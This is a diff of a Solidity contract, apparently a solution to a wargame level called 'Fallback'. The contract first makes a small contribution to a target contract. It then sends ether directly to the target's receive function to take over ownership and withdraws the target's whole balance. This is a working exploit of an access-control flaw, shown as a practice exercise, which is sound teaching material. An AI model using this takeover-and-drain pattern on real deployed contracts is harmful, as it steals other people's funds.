@@ -14,27 +14,34 @@ interface FallbackI {
 contract Level1Solution is Ownable {
     address fallbackAddress;
 
-    event ReceivedAmount(uint256 amountReceived);
+    event ReceivedAmount(address indexed from, uint256 amountReceived);
+    event Withdraw(uint256 withdrawAmount);
 
     constructor(address _address) payable {
         fallbackAddress = _address;
 
-        FallbackI(_address).contribute{value: 0.0001 ether}();
+        // requirement of Fallback's receive function
+        FallbackI(_address).contribute{value: 500 wei}();
+    }
 
-        (bool sent, ) = payable(_address).call{value: 0.0001 ether}("");
+    function gainControlAndWithdraw() public onlyOwner {
+        // send ether and gain control of the contract
+        (bool sent, ) = payable(fallbackAddress).call{value: 0.0001 ether}("");
         require(sent, "Failed to send Ether");
 
-        FallbackI(_address).withdraw();
+        FallbackI(fallbackAddress).withdraw();
     }
 
     function withdraw() public onlyOwner {
         uint256 amount = address(this).balance;
         (bool sent, ) = owner().call{value: amount}("");
         require(sent, "Failed to send Ether");
-        emit ReceivedAmount(amount);
+        emit Withdraw(amount);
     }
 
     fallback() external {}
 
-    receive() external payable {}
+    receive() external payable {
+        emit ReceivedAmount(msg.sender, msg.value);
+    }
 }
